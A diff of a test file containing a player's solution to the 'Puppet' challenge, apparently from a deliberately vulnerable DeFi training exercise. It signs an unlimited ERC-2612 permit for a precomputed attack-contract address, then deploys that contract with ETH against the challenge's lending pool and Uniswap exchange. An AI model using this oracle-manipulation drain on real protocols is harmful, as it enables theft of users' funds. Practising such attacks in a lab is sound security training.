@@ -99,12 +99,14 @@ describe('[Challenge] Puppet', function () {
         /** CODE YOUR SOLUTION HERE */
 
         //Calculate where the contract will be deployed
-        const attackContractAddress = ethers.utils.getContractAddress({from: player.address,nonce: 0});
+        const futureAddress = ethers.utils.getContractAddress({from: player.address, nonce: 0});
 
         //generate the permit signature
-        const { v, r, s } = await signERC2612Permit(player, token.address, player.address, attackContractAddress, ethers.constants.MaxUint256);
+        const {v,r,s} = await signERC2612Permit(player, token.address, player.address, futureAddress, ethers.constants.MaxUint256, ethers.constants.MaxUint256);
 
-        await ethers.getContractFactory('Attack_Puppet', player).then(c => c.deploy(lendingPool.address, uniswapExchange.address, token.address, v, r, s, {value:  ethers.utils.parseEther('10')}));
+        //deploy and give it all besides 1 eth
+        const Attack_Puppet = await ethers.getContractFactory('Attack_Puppet', player);
+        await Attack_Puppet.deploy(lendingPool.address, uniswapExchange.address, token.address, v, r, s, {value:  ethers.utils.parseEther('24')});
     });
 
     after(async function () {
